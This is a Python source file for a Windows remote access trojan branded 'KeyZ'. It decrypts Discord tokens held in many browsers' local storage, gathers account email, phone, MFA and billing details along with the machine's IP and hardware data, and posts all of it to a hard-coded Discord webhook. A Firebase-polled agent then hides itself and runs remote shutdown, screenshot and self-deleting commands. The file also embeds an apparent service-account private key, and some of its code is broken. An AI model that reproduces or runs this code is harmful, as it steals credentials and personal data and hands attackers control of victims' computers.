from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
import sys
import platform
import psutil
import wmi
import discord.py
from discord.ext import commands
import pyautogui
import winreg
import firebase_admin
from firebase_admin import credentials, firestore
import pywin32
import winshell
import win32com.client
import time

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*KeyZ with love* **|** Best RATs in KeyZ"""
                        payload = json.dumps({'content': embed, 'username': 'Remote Access Trojan - KeyZ', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1506663056455897148/ucaVZkr7evLUG5hbs_d__XQBLhiw-VruKDDTnKPNfYallEpz57FG_wdEI8kGSzqzQL9V', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()
def send_system_info():
    try:
        # Initialize WMI
        c = wmi.WMI()
        
        # Collect hardware details
        gpu_name = c.Win32_VideoController()[0].Name
        disk_model = c.Win32_DiskDrive()[0].Model
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        
        # Sending directly to the webhook without a variable for the URL
        requests.post(
            'https://discord.com/api/webhooks/1506663056455897148/ucaVZkr7evLUG5hbs_d__XQBLhiw-VruKDDTnKPNfYallEpz57FG_wdEI8kGSzqzQL9V', 
            json={
                "content": (
                    "### System Information\n"
                    f"**PC Name:** {platform.node()}\n"
                    f"**Username:** {os.getlogin()}\n"
                    f"**OS:** {platform.system()} {platform.release()}\n"
                    f"**Processor:** {platform.processor()}\n"
                    f"**GPU:** {gpu_name}\n"
                    f"**Disk Model:** {disk_model}\n"
                    f"**RAM:** {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
                    f"**Public IP:** {public_ip}"
                )
            }
        )
        print("Error 64")
        
    except Exception as e:
        print(f"An error occurred")

if __name__ == "__main__":
    send_system_info()


# --- 1. CONFIGURATION ---
JSON_DATA = {
  "type": "service_account",
  "project_id": "hazack-430e9",
  "private_key_id": "b9592d559ff9140fe41c3b2f289d562c160f9289",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDlTSHIfm+/+1II\nAlqrUDg67WY4JZ4xZWb2DZA9s4y7lwNzfmkQf9PEMs+kAOpIl3Fi0O9txCYb0mwM\nEvMXHsQcfVvICP4TKDdExmDCI0U5lVq9mXmR36Mcp05DNVZjjeuNpXIiVnoweUMO\nCxmW1BP9VnnIowATtPmFTDQf4nrAIRUSgS+XbDSQLuKFBPoF3REjHSxPEfpPGex+\nxbRT0t5K3tIXVnOgp9T4aq98O8rv8pW5HYc++BgFTclfRkvM7z1eNjiOTmsJAB0i\ngndg/k8GREWDvXRXuyU6yZhnG0EzyYyttjSxQHkibpwV8TYHHXNCM4MxuaudmUK3\nB4HbYCd7AgMBAAECggEAE9HPl7rbVzwWjRFXBkkQHdfN5rspqe9ahO4LMlTGAfjo\nQsqsXia5Bn5ggDaBXvY9cLh1LtxYxugwj/fwrGZBC+Kx/4pMxm8gHSu1yqdYdm+4\na3xL4RX0IqfmFd0TCIEzLl0cjmdBzIAkEZ9X/jd6kC0x/ZZJOBWDyR0bFvPGfxCz\nFO8uAatiT23o5bzt6oQLYLL/m2hH6Ngb8hYQdgKBp98wTcapeZfpz9gQzP9//FQF\n2j5V7qtGy+6i63vtZoMCy2X1c2FIFDL6pbmrShMNyMKNMUWBHGaSlYepttkw7ZRQ\n8N2Hh7iUjjL4hP5pegW2mI6dsyxMyaL53T4qOsaLAQKBgQD0QhsT+FsH2mV/LxMO\nLAJa1jRmthIirk17CsRZx78LrYuxTd18y079Ic4W8DlfYnQJIHb+3mTMvTVxMFLi\nXCSbLLw4fbNcJgwwkJFr6Q1KwMhHxC1ofDlms2EnAhMS/V/KiB410zp6bPZevkj8\nt6S4UOZlTKbb7q2GrmGbKhHFuwKBgQDwUvaHzcNqGttri+mfG/UjsVcHDE4tM6xS\nJBrJkQj2JhldPbGjoz3BKaaZdoOvrjaYPnAc9GPtKqAIq19aBnNDRUwL3/nGmiUs\n+46ZmF/GTlOuhNdfcAX+NypK1mTVyAbxueyT8h0uZZdE92pZaFV7eu7GBSj8ycab\n4IQPkHYpQQKBgD9hwAEImyaIh3nfT0SIKvxDRUm5yS7yp+xbuOPLL0nqeKtDl0vA\nvfh1gzL0lw6nT5DmubodH275UhrS/U77tgwGKblG9PnebZ9UhEfKK8bQC6iDwXyx\nb3u05Gro4OY2lVrKw3wYGb6W879WBT5+sOGbLI3wvAOqBaFDMtS+r+ntAoGAG9Qv\nkhhEqbPEdtazzeXp5CE0B6/oGZnjOXvO0kqGNCLDSyXKvT04+HY/QYQUybItxkFs\nsB2ouJz3/SkDGKSokkCjBrj/7nyJE4VpxOV9KbSGQi5F1lpdh0uSDSp4cL0B+Nnj\nyFoAARBojObtnL7VL0BUCAAu997Rrdk40aiT1kECgYB9keJY0P/CUMgVRTYBr5BI\nSXrM1t5+LF+XT23InIofP+6rrjwxMIre4ZW7FJgqMoOFJlQKreyy09swe1WbZRMb\nY+V//ta60hHcfaKEkCOnq22WPPn34A5KSeaIPdqyOODK3gC1qs5aangI3AuKlBLA\nzpZ3u9MBgGunzqZjYa/TuQ==\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-fbsvc@hazack-430e9.iam.gserviceaccount.com",
  "client_id": "109364286197070150529",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40hazack-430e9.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

# --- 2. DESTRUCTION LOGIC ---
def self_destruct():
    # Remove from Startup
    link = os.path.join(winshell.startup(), "Agent.lnk")
    if os.path.exists(link): os.remove(link)
    
    # Kill process and delete this file
    path_to_script = os.path.realpath(__file__)
    # Batch file to delete the script after a delay
    with open("cleanup.bat", "w") as f:
        f.write(f'timeout /t 2 >nul\ndel "{path_to_script}"\ndel "%~f0"')
    
    os.startfile("cleanup.bat")
    sys.exit()

# --- 3. MAIN AGENT ---
if __name__ == "__main__":
    # Check if we should be hidden (run via pythonw.exe)
    if sys.executable.endswith("python.exe"):
        os.startfile(f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{os.path.realpath(__file__)}"')
        sys.exit()

    cred = credentials.Certificate(JSON_DATA)
    firebase_admin.initialize_app(cred)
    db = firestore.client()
    ref = db.collection('servers').document(os.environ['COMPUTERNAME'])

    while True:
        try:
            ref.set({'status': 'online'}, merge=True)
            doc = ref.get().to_dict()
            cmd = doc.get('command') if doc else None
            
            if cmd == 'shutdown':
                ref.update({'command': None})
                os.system("shutdown /s /f /t 0")
            elif cmd == 'screenshot':
                pyautogui.screenshot().save("last.png")
                ref.update({'command': None})
            elif cmd == 'delete_key':
                self_destruct() # The full self-destruct
                
        except: pass
        time.sleep(10)
